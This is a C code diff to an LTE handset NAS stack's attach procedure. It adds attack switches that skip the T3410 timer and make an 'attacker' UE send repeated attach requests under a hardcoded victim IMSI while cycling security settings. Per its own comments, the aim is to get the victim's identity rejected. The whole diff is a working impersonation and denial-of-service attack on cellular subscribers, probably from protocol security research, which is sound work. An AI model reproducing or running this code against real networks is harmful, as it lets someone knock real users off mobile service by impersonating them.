@@ -70,6 +70,8 @@ Description Defines the attach related EMM procedure executed by the
 #include <string.h> // memcmp, memcpy
 #include <stdlib.h> // malloc, free
 
+#include "attack_extern.h"      /* bts_attack and auth_synch_attack */
+
 /****************************************************************************/
 /****************  E X T E R N A L    D E F I N I T I O N S  ****************/
 /****************************************************************************/
@@ -77,6 +79,8 @@ Description Defines the attach related EMM procedure executed by the
 /****************************************************************************/
 /*******************  L O C A L    D E F I N I T I O N S  *******************/
 /****************************************************************************/
+
+static int _mutate_counter = 0;
 
 /* String representation of the EPS attach type */
 char *emm_attach_type2str(int type) {
@@ -252,9 +256,11 @@ int emm_proc_attach(nas_user_t *user, emm_proc_attach_type_t type)
     }
 
     /* Start T3410 timer */
+    if (bts_attack == 0) {      // handle ATTACH_REQUEST and ATTACH_REJECT
     emm_timers->T3410.id = nas_timer_start(emm_timers->T3410.sec, emm_attach_t3410_handler, user);
     LOG_TRACE(INFO,"EMM-PROC  - Timer T3410 (%d) expires in %ld seconds",
               emm_timers->T3410.id, emm_timers->T3410.sec);
+    }
     /* Stop T3402 and T3411 timers if running */
     emm_timers->T3402.id = nas_timer_stop(emm_timers->T3402.id);
     emm_timers->T3411.id = nas_timer_stop(emm_timers->T3411.id);
@@ -268,6 +274,36 @@ int emm_proc_attach(nas_user_t *user, emm_proc_attach_type_t type)
     /* Get the PDN connectivity request to transfer within the ESM
      * container of the initial attach request message */
     emm_sap.u.emm_as.u.establish.NASmsg = esm_sap.send;
+
+    // Authentication sync failure attack
+    // ueid-1: attacker, ueid-2: victim
+    // For attacker, use the victim's IMSI
+    if (auth_sync_attack /* > 0 */) {
+       LOG_TRACE(INFO, "[Testtt] UE: %d, auth sync failure attack, generating massive attach reject with victim IMSI\n", user->ueid);
+       // victim and attacker will use the same IMSI
+       imsi_t imsi;
+       (void) memcpy (&imsi, user->emm_data->imsi, sizeof (imsi));
+       imsi.u.num.digit1  = 2;
+       imsi.u.num.digit2  = 0;
+       imsi.u.num.digit3  = 8;
+       imsi.u.num.digit4  = 0;
+       imsi.u.num.digit5  = 1;
+       imsi.u.num.digit6  = 0;
+       imsi.u.num.digit7  = 2;
+       imsi.u.num.digit8  = 7;
+       imsi.u.num.digit9  = 2;
+       imsi.u.num.digit10 = 9;
+       imsi.u.num.digit11 = 2;
+       imsi.u.num.digit12 = 3;
+       imsi.u.num.digit13 = 9;
+       imsi.u.num.digit14 = 0;
+       imsi.u.num.digit15 = 6;
+       emm_as->UEid.imsi  = &imsi;
+       // randomly assign security configurations
+       emm_as->encryption = _mutate_counter % 4;
+       emm_as->integrity  = _mutate_counter % 4;
+       ++_mutate_counter;
+    }
     rc = emm_sap_send(user, &emm_sap);
   }
 
